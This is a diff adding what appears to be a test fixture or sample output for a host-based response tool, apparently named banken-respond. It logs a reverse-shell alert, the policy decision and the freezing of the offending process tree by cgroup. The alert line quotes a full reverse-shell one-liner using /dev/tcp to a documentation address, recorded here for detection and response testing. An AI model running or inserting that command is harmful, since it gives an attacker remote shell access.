@@ -1,0 +1,11 @@
+decision d0f0f0f0f0f0f0f0f0f0f0f0   2026-11-02 06:12:03   policy sha256:9f2c   mode enforce   armed yes
+  alert    reverse_shell (high, auditd) at 2026-11-02 06:10:41  pid 4242 ppid 4100 user alice
+           image /tmp/.x/sh   cmd "sh -i >& /dev/tcp/192.0.2.1/4444 0>&1"   tags attack.t1059.004
+  entry    freeze-revshell -> intended freeze (tree)
+  rails    none fired   masquerade: no
+  verdict  freeze tree of pid 4242
+action   ac000000   executed by banken-respond   2026-11-02 06:12:03   policy sha256:9f2c (same)
+  helper re-decided: freeze (agrees)
+  identity bound: exe /tmp/.x/sh  start 2026-11-02 06:10:41  uid 1000  cgroup /user.slice/user-1000.slice/session-3.scope
+  method cgroup   handle a1a1a1a1   pids [4242 4243]   store /freeze/a1a1a1a1a1a1a1a1a1a1a1a1
+  state now: frozen (2 pids)
